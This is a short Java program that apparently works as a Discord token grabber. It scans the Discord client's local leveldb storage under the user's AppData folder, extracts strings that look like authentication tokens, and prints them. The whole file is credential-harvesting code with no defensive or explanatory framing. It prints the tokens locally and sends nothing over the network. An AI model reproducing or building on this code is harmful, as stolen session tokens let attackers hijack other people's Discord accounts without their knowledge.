import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;

public class Main {

	public static ArrayList<String> arr = new ArrayList<String>();

	public static void main(String[] args) throws IOException {
		for (String s : new File(System.getenv("appdata") + "/discord/Local Storage/leveldb").list()) {
			BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(new DataInputStream(new FileInputStream(System.getenv("appdata") + "/discord/Local Storage/leveldb" + "/" + s))));
			String strLine;
			while ((strLine = bufferedReader.readLine()) != null && s.endsWith("ldb")) {
				while ((strLine.indexOf("oken")) != -1) {
					strLine = strLine.substring(strLine.indexOf("oken") + "oken".length());
					if ((strLine.split("\"")[1]).length() > 8) arr.add("Token : "+strLine.split("\"")[1]);
				}
			}
			bufferedReader.close();
		}
		for(String s : arr) {
			System.out.println(s);
		}
	}

}
